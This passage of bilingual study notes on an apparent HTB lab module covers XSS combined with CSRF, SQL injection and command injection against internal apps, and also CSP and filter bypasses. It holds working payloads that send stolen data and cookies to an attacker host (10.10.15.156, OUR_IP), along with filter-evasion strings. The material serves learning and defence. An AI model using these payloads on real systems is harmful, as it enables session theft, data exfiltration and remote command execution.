xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>After logging in, the following information will be displayed on the screen:</p>
<pre><code>(1, 'admin', 'InternalAdmin2023!', 'This is the default admin account.')</code></pre>
<p>The data appears to include usernames, passwords and account descriptions. Let's confirm this by exporting the entire users table. We can detect database systems just like we detect other SQL injection vulnerabilities by enumerating common payloads. In this case we are dealing with a <code>SQLite</code> database. Since there appear to be four columns in the output, we can export all tables using the following payload:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>We can then export the table's schema <code>users</code>: </p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>This reveals the following database schema:</p>
<pre><code class="language-sql">CREATE TABLE \`users\` (
    \`id\` int(11) NOT NULL,
    \`username\` varchar(256) NOT NULL,
    \`password\` longtext NOT NULL,
    \`info\` longtext NOT NULL
)</code></pre>
<p>Finally, we can iteratively export the users table using the following payload:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>The table names are: users,<code>secretdata</code></p>
<pre><code>var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(name) FROM pragma_table_info('secretdata')-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p><code>secretdata</code> Internal and external <code>data</code> and <code>id</code>.</p>
<pre><code>var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(id||':'||data) FROM secretdata-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<h2>Leveraging Internal Web Applications (2)</h2>
<p><strong>Identify vulnerabilities</strong> The identification process is essentially the same as that discussed in the previous section. We will use the same XSS base payload and the management endpoint contains a reference to another internal web application <code>https://internal.internal-webapps-2.htb</code>. We can steal the index of this internal web application using the following payload:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-2.htb/', false);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>This will display the following HTML content, indicating that we can use this web application to check the status of different web applications:</p>
<img alt="Pasted image 20260418165934" src="assets/posts/advanced-xss-csrf/Pasted image 20260418165934.png"/>
<p>We can determine exactly how the web application implements this functionality by analyzing the form and constructing a corresponding POST request:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("https://internal-webapps-2.htb")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>This will result in the following response:</p>
<pre><code>HTTP/1.1 200 OK</code></pre>
<p>Let’s try a domain name that doesn’t exist and see if that triggers the error message:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("https://doesnotexist.htb")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>This will result in the following response:</p>
<pre><code>curl: (6) Could not resolve host: doesnotexist.htb</code></pre>
<p>As we can see, the status seems to be obtained by some means <code>curl</code>. Command injection vulnerabilities can exist if implemented improperly or if proper security measures are lacking. We can verify this by injecting an additional curl command into the data leak server:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| curl -k https://10.10.15.156:4443?pwn")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>Afterwards, we can see the expected request on the data breach server, confirming the existence of the command injection vulnerability:</p>
<pre><code>Chenduoduo@htb[/htb]$ python3 server.py Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)... 10.129.136.40 - - [30/Nov/2025 13:31:33] "GET /?pwn HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:33] "OPTIONS /log HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:36] [i] POST body: {"data":"PCFET&lt;SNIP&gt;tbD4="} 10.129.136.40 - - [30/Nov/2025 13:31:36] "POST /log HTTP/1.1" 200 -</code></pre>
<p><strong>exploit</strong> We can specify the command injection payload in the XSS attack payload and leak the results to the leak server. Therefore, this exploit is no different from other command injection vulnerabilities. For example, we can execute the following command <code>id</code>: </p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| id")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>The result is included in the base64-encoded response:</p>
<pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| cat /* 2&gt;/dev/null | tr '\n' ' '")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<h2>Content Security Policy (CSP)</h2>
<p>Content Security Policy (CSP) is a defense-in-depth security measure that reduces the severity of cross-site scripting (XSS) vulnerabilities by limiting their exploitability. CSP is configured in the <code>Content-Security-Policy</code> response header.</p>
<h3>CSP basics</h3>
<p>It consists of multiple instructions. Each directive allows one or more values. The browser enforces the CSP and blocks the resource from loading or executing based on the CSP. This section discusses some example instructions.</p>
<p>For example, the <code>script-src</code> directive defines where JavaScript can be loaded and executed from; we can limit the domains from which JavaScript code is allowed to be loaded using the following policy:</p>
<pre><code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></pre>
<p>This Content Security Policy (CSP) instructs browsers to load JavaScript only from sources that have the same origin as the page itself and from external sources <code>https://benignsite.htb</code>. Therefore, if an attacker injects the following JavaScript code in an XSS payload, the victim's browser will not load the script and therefore will not execute it:</p>
<pre><code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></pre>
<p>However, the following scripts are allowed to be loaded and executed:</p>
<pre><code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></pre>
<p>In addition, because the <code>unsafe-inline</code> value is not specified, it blocks all inline scripts. As a result, the following potential XSS payloads are blocked and will not execute:</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
<p>Additionally, there are some other common directives:</p>
<ul><li><code>style-src</code>: allowed sources for style sheets</li><li><code>img-src</code>: allowed image sources</li><li><code>object-src</code>: allowed sources for embedded objects such as <code>&lt;object&gt;</code> or <code>&lt;embed&gt;</code></li><li><code>connect-src</code>: sources that scripts may contact with HTTP requests, for example through <code>XMLHttpRequest</code></li><li><code>default-src</code>: This fallback value is used if no other directive is explicitly set. For example, if the <code>img-src</code> directive does not exist in the CSP, the browser will use this value to process the image.</li><li><code>frame-ancestors</code>: controls which sources may embed the page in a frame, such as an <code>&lt;iframe&gt;</code>. This directive can help prevent clickjacking.</li><li><code>form-action</code>: allowed destinations for form submissions</li></ul>
<p>Other values for the directive include:</p>
<pre><code>- \`*\`: all sources are allowed
- \`'none'\`: no sources are allowed
- \`*.benignsite.htb\`: all subdomains of \`benignsite.htb\` are allowed
- \`unsafe-inline\`: inline elements are allowed
- \`unsafe-eval\`: dynamic code execution is allowed, such as JavaScript's \`eval\` function
- \`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d\`: allows an element by hash
- \`nonce-S0meR4nd0mN0nC3\`: allows an element by nonce</code></pre>
<p>For other CSP directive values, see the list provided here.</p>
<hr/>
<h3>Security CSP</h3>
<p>Enforcing content security policies (CSP) as strictly as possible is critical to ensuring the security of web applications. A good approach is to start with a strict baseline CSP and gradually relax the restrictions until the web application behaves as expected. A good baseline CSP is as follows:</p>
<pre><code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></pre>
<p>This Content Security Policy (CSP) only allows images, stylesheets, and scripts to be loaded from the same source. It also only allows JavaScript to make HTTP requests and form submissions to the same origin, only allows resources from the same origin to be embedded in web pages, and prevents any other resources from loading. If any external resources are used, this CSP must be adjusted accordingly.</p>
<p>Additionally, inline JavaScript code used by web applications must be removed to prevent it from being blocked. This can be easily accomplished by moving it to a script file and loading it. For example, consider the following inline JavaScript code:</p>
<pre><code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></pre>
<p>Create <code>test.js</code> with functionally equivalent code:</p>
<pre><code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></pre>
<p>Then load the script:</p>
<pre><code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></pre>
<p>This removes all inline JavaScript code.</p>
<p>We can use existing online tools to assess cloud security policies (CSP), such as the CSP assessment tool provided by Google. For more details on how to write a secure CSP, see the OWASP CSP Cheat Sheet.</p>
<h2>Bypass weak CSPs</h2>
<hr/>
<p>Now that we have discussed CSP, CSP instructions, and CSP instruction values, let’s discuss how to exploit and bypass weak CSP.</p>
<hr/>
<h3>Bypass weak CSPs</h3>
<p>Content Security Policy (CSP) can be used as a defense-in-depth measure to prevent cross-site scripting attacks (XSS). However, even if a web application implements CSP, it does not mean that it is automatically protected against all XSS attacks. If the CSP is vulnerable, it is possible for an attacker to bypass it. Therefore, it is crucial to analyze a web application's CSP for potential bypass vulnerabilities.</p>
<p>Let’s first look at the CSP below:</p>
<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></pre>
<p>This CSP allows loading of images from the source itself, loading of styles and fonts from any location, and loading of scripts from the source itself and any of its subdomains <code>google.com</code>. All other resources cannot be loaded due to this directive <code>default-src 'none'</code>.</p>
<p>Let's say we try to inject a simple warning popup into a web application as a proof of concept:</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>Due to CSP limitations, the warning popup will not be displayed; instead, the browser's JavaScript console will print the following error message:</p>
<pre><code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></pre>
<p>While this defense technique may seem secure at first glance, it can be bypassed through <a href="https://www.w3schools.com/js/js_json_jsonp.asp" rel="noreferrer" target="_blank">JSONP</a>. JSONP is a technology that can retrieve data across different sources without being restricted by the same-origin policy. The basic idea of JSONP is to use <code>script</code> tags to retrieve data across sources because tags are not restricted by the same-origin policy. For example, suppose a web application at <code>https://vulnerablesite.htb</code> wants to retrieve data from the endpoint <code>https://someapi.htb/stats</code>, this endpoint returns the following JSON data:</p>
<pre><code>{'clicks': 1337}</code></pre>
<p>If the API is not configured with CORS, the web application cannot access the response to the cross-domain request due to the same-origin policy restrictions. However, because script tags are not subject to the same-origin policy, web applications can load data by using the following HTML tags on their pages:</p>
<pre><code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></pre>
<p>However, this is not practical in itself because the web application needs to process the data in some way. Assume that the web application implements a <code>processData</code> function for this purpose. However, there is currently no way to pass the received data to this function. This is where JSONP comes in handy. If the API supports JSONP, it reads the GET parameters on the endpoint sending the data and adjusts the response accordingly. This parameter is usually called <code>get_data</code> <code>callback</code>. Let's say we call the endpoint <code>get_data</code> <code>https://someapi.htb/stats?callback=processData</code>. This will cause the API to send the following response:</p>
<pre><code>processData({'clicks': 1337})</code></pre>
<p>Web applications can now insert the following script tags on their pages:</p>
<pre><code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></pre>
<p>This allows the web application to call its <code>processData</code> function with data obtained from the API across origins without violating the Same Origin Policy or requiring CORS.</p>
<p>Because JSONP endpoints allow the caller to specify a function to call, they can be used to dynamically create JavaScript code sent by a domain that provides a JSONP endpoint. Therefore, JSONP can be used to bypass Content Security Policy (CSP). Google provides several JSONP endpoints. The JSONBee <a href="https://github.com/zigoo0/JSONBee" rel="noreferrer" target="_blank">GitHub</a> repository lists a number of JSONP endpoints that can be used to bypass CSP. We can bypass the above CSP using the following Google JSONP endpoint:</p>
<pre><code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></pre>
<p>Posting this entry to the guestbook triggers a warning popup, thus bypassing Content Security Policy (CSP):</p>
<p>https://vulnerablesite.htb/view.php</p>
<img alt="Referenced image" src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/235/xss/xss_csp_1.png"/>
<p>Another common pitfall is assuming the <code>'self'</code> value is safe by itself. For example, consider the following CSP:</p>
<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></pre>
<p>This time, the script can only be loaded from the origin server itself. This seems safe assuming the origin server does not provide a JSONP endpoint. However, consider a situation where a web application allows users to upload files. If any file type is allowed to be uploaded, an attacker can upload files <code>.js</code>. An attacker can then exploit the XSS vulnerability by loading the uploaded payload from the origin server itself:</p>
<pre><code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></pre>
<p>Typically, the evaluation of a Content Security Policy (CSP) depends on the specific CSP itself and the functionality of the web application. As we can see, if a web application implements file upload functionality, setting the <code>script-src</code> directive to <code>'self'</code> may be unsafe. Therefore, it is crucial to evaluate CSP in the context of a specific web application.</p>
<p>&lt;scriPt sRc="https://exploitserver.htb/exploit"&gt;&lt;/scripT&gt;</p>
<h2>XSS filter bypass</h2>
<p><strong>Implement JavaScript execution</strong> Before discussing how to bypass XSS filters, we'll explore three ways to achieve JavaScript code execution.</p>
<p>The most common (and obvious) way to achieve code execution is to use <code>script</code> tag; the web browser will execute any JavaScript code contained within it:</p>
<ul><li><strong>script tag</strong></li></ul>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>We can use pseudo-protocols (e.g.<code>javascript</code> or <code>data</code>) to specify the loading location of data in certain HTML attributes to implement JavaScript code execution. For example, we can <code>a</code> The label's target is set to <code>javascript</code> Pseudo-protocol so that when a link is clicked, the corresponding JavaScript code is executed:</p>
<ul><li><strong>pseudo-agreement</strong></li></ul>
<pre><code class="language-html">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
<p>We can also create XSS payloads with pseudo-protocols that require no user action. For example, use <code>object</code> label. <code>data</code> The pseudo-protocol allows us to specify plain HTML code or base64-encoded HTML code:</p>
<pre><code class="language-html">&lt;object data="javascript:alert(1)"&gt;
&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</code></pre>
<p>Third, we can use event handlers like <code>onload</code> or <code>onerror</code> to specify JavaScript code to be executed when the event handler is triggered:</p>
<ul><li><strong>Event Handlers Event Handlers</strong></li></ul>
<pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;</code></pre>
<p>We have a number of event handling tools that can be used for this purpose. PortSwigger's XSS Cheat Sheet provides a good overview.</p>
<h3>Bypass basic blacklist</h3>
<p>Suppose a web application implements a simple blacklist to block keywords that may cause JavaScript code to be executed. For example, by blocking something like <code>JavaScript</code> tags such as HTML tags, like <code>JavaScript</code> and <code>data</code> Such pseudo-protocols, as well as <code>onload</code> and <code>onerror</code> Such an event handler.</p>
<p>In this case, we can try some methods to bypass the naive blacklist. For example, shells in HTML tags, pseudo-protocols, and event handlers are irrelevant. More specifically, we can use a mix of lowercase and uppercase letters to bypass blacklists that only block lowercase keywords:</p>
<pre><code class="language-html">&lt;ScRiPt&gt;alert(1);&lt;/ScRiPt&gt;
&lt;object data="JaVaScRiPt:alert(1)"&gt;
&lt;img src=x OnErRoR=alert(1)&gt;</code></pre>
<p>Furthermore, if a naive blacklist removes all keywords <code>&lt;script&gt;</code> appears, but without recursive application, we can bypass this filter with a payload like:</p>
<pre><code class="language-html">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/scr&lt;script&gt;ipt&gt;</code></pre>
<p>Finally, if the blacklist uses assumptions about HTML tag syntax or weak regular expressions that only block certain special characters, we may be able to bypass the blacklist by breaking these assumptions. For example, if the blacklist does not allow spaces before any event handlers or input fields, the following payload may bypass the filter:</p>
<pre><code class="language-html">&lt;svg/onload=alert(1)&gt;
&lt;script/src="https://exploit.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<h3>Advanced bypass</h3>
<p>Suppose we inject an HTML tag, thereby executing JavaScript code. In this case, we may need to bypass additional filters attached to the JavaScript code that restrict which functions we can call or which data we can access. There are many techniques we can employ to try to bypass these filters. We'll explore how to encode strings and pass those strings to <code>execution sinks</code> to execute JavaScript code to bypass the filter.</p>
<p>In JavaScript, we can apply multiple encodings to strings that help us circumvent blacklists. The following is the string <code>"alert (1)"</code> Different encoding methods:</p>
<pre><code class="language-js"># Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"

# Octal Encoding
"\141\154\145\162\164\50\61\51"

# Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"

# Base64 Encoding
atob("YWxlcnQoMSk=")</code></pre>
<p>In order to serve payloads in series, we need to be able to use quotes. If the filter removes or blocks quotes, we can use one of the following tricks to create a string containing the payload:</p>
<pre><code class="language-js"># String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

#.source
/alert(1)/.source

# URL Encoding
decodeURI(/alert(%22xss%22)/.source)</code></pre>
<p>So far, we can only serve the payload as a string; however, the browser will only execute it if it is passed to an execution import that receives a string as input. The most famous example of this type of execution exchange is <code>eval</code>  function; except <code>eval</code>, other execution summaries also include:</p>
<pre><code class="language-js">eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()</code></pre>
<p>Finally, we can combine execution sinks with encoded strings to try to bypass weak XSS filters:</p>
<pre><code class="language-js">eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()</code></pre>
<blockquote><strong>Note:</strong> To bypass XSS filters in the real world, we can apply the same methods as for other vulnerabilities such as SQL injection or command injection. The actual bypass depends on the filters implemented by the web application. It requires careful testing to identify which keywords are whitelisted or blacklisted in order to design an unblocked exploit.</blockquote>
<p>To learn more about XSS filter bypasses, check out OWASP’s XSS Filter Avoidance Cheat Sheet. Additionally, there are collections of XSS payloads for different types of filters. For example, if parentheses are not possible, we can reference the XSS payload collection without parentheses. Additionally, the HTML 5 Security Cheat Sheet provides more browser-specific examples of XSS exploits.</p>
<h2>skills assessment</h2>`,
      zh: String.raw`<h2>漏洞简介</h2>
<p><strong>XSS（Cross-Site Scripting）</strong> 是一种常见的 Web 安全漏洞，本质是：</p>
<blockquote>攻击者把恶意脚本（通常是 JavaScript）注入到网页中，让其他用户在浏览该页面时执行这些脚本。</blockquote>
<p>也就是说：</p>
<ul><li>攻击代码被“存”在网页或请求里</li><li>浏览器误认为是“正常内容”执行了</li><li>最终<strong>在受害者浏览器中执行攻击者的代码</strong></li></ul>
<div class="post-table-wrap"><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>最严重的 XSS 类型是当用户输入存储在后端数据库中，然后在检索时显示（例如，帖子或评论）时发生的 XSS 攻击。</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>当用户输入的内容经后端服务器处理后显示在页面上，但尚未存储时（例如，搜索结果或错误消息），就会发生这种情况。</td></tr><tr><td><br/><code>DOM-based XSS</code></td><td>另一种非持久性 XSS 类型，当用户输入直接显示在浏览器中并在客户端完全处理，而无需到达后端服务器时就会发生（例如，通过客户端 HTTP 参数或锚标记）。</td></tr></tbody></table></div>
<pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<ul><li><code>window.origin</code> 显示的是当前站点的协议 + 域名 + 端口</li><li><code>document.cookie</code> 显示的是当前页面可读到的 Cookie</li></ul>
<p><strong>DOM XSS</strong></p>
<p>什么是 Source 和 Sink 在 <strong>DOM-based XSS</strong> 里，你可以把整个过程理解成两步：</p>
<ol><li><strong>Source（源）</strong>：用户可控数据从哪里进入页面脚本</li><li><strong>Sink（汇）</strong>：这些数据最终被写到哪里，并且是否会被浏览器当成代码/HTML解析执行</li></ol>
<p>也就是说：</p>
<blockquote><strong>Source 负责“进来”，Sink 负责“落地”</strong></blockquote>
<p>只要满足下面这个链条，就可能形成 DOM XSS： 用户可控输入 → Source 读取 → JavaScript 处理 → Sink 写入 DOM → 浏览器解析并执行恶意内容</p>
<pre><code class="language-JavaScript"># 当整个页面 DOM 加载完成后，执行里面的代码。 等价于: $(document).ready(function () {
$(function () {
	# 给id 为add的元素绑定一个点击事件,
    $("#add").click(function () {
	    # \`$("#task")\`, 选中 id 为 \`task\` 的元素
	    # \`.val()\` , 取这个输入框当前的值。
	    # \`.length &gt; 0\`, 判断输入内容是不是非空。
        if ($("#task").val().length &gt; 0) {
	        
	        # 修改当前页面 URL, 如果输入为test, 将其变为 \`http://example.com/#task=test\`
            window.location.href = "#task=" + $("#task").val();
            var pos = document.URL.indexOf("task=");
            var task = document.URL.substring(pos + 5, document.URL.length);
            
            # \`.innerHTML = ...\`, 把右侧的内容作为 HTML 写进这个元素中。
            # decodeURIComponent(task), 把 URL 编码内容解码。   %3C -&gt; &lt;
            document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
        }
    });
});
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
if (pos &gt; 0) {
    document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
}
</code></pre>
<pre><code>...PAYLOAD... &lt;!--</code></pre>
<p><strong>会话劫持</strong></p>
<pre><code>document.location='http://OUR_IP/index.php?c='+document.cookie; 
new Image().src='http://OUR_IP/index.php?c='+document.cookie;</code></pre>
<pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;11111&lt;/span&gt;&amp;quot;</code></pre>
<ul><li><code>&amp;quot;</code> 是 HTML 实体，表示英文双引号 <code>"</code>。</li></ul>
<p>payload <code>&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;</code> 被编码转换为<code>&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt</code> ,网站对 <code>&lt;</code> 和 <code>&gt;</code> 做了 HTML 实体编码 ,所以不会被执行.</p>
<pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/span&gt;&amp;quot;</code></pre>
<h2>高级 CSRF 与 XSS 利用介绍</h2>
<p>跨站点请求伪造（CSRF）和跨站点脚本（XSS）</p>
<p><strong>现代CSRF和XSS攻击的现实应用</strong> 我们将在本模块中讨论的那样，现代网络浏览器中的许多安全策略和安全措施限制或阻止了对 CSRF 漏洞的基本利用。例如，同源策略、跨域资源共享 (CORS) 和 SameSite Cookie，我们将在后续章节中进一步探讨。</p>
<p>因此，在现实世界中，单纯的 CSRF 漏洞利用变得越来越少见。然而，如果我们发现 XSS 漏洞，就可以将 XSS 和 CSRF 漏洞的利用结合起来，从而获得一种强大的工具，使我们能够攻击存在漏洞的 Web 应用程序本身，甚至可能攻击受害者内部网络中的其他 Web 应用程序。</p>
<p>要利用 CSRF 和 XSS 漏洞并与存在漏洞的 Web 应用程序交互，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a>对象或更现代的<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" rel="noreferrer" target="_blank">Fetch API</a>。我们可以使用这两种方法从 JavaScript 代码发出 HTTP 请求，并指定 HTTP 参数，例如请求方法、HTTP 标头或请求体。</p>
<p>例如，我们可以<code>XMLHttpRequest</code>通过在调用 <code>send_post()</code> 函数时指定 URL <code>xhr.open</code>、使用 <code>set_HTTP_headers()</code> 函数设置 HTTP 标头<code>xhr.setRequestHeader</code>以及在调用 <code>send_post_body()</code> 函数时指定请求体参数来使用该对象发送 POST 请求<code>xhr.send</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest(); 
xhr.open('POST', 'http://exfiltrate.htb/', false); 
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
xhr.send('param1=hello&amp;param2=world');</code></pre>
<p>另一方面，我们可以使用<code>Fetch API</code>如下方式发送相同的请求：</p>
<pre><code class="language-js">const response = await fetch('http://exfiltrate.htb/', {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'param1=hello&amp;param2=world',
  });</code></pre>
<p>该函数<code>fetch</code>第一个参数需要传入 URL。我们可以将所有其他请求参数放在一个对象中，作为第二个参数传入。</p>
<p><strong>lab环境</strong> 实验室由以下部分组成：</p>
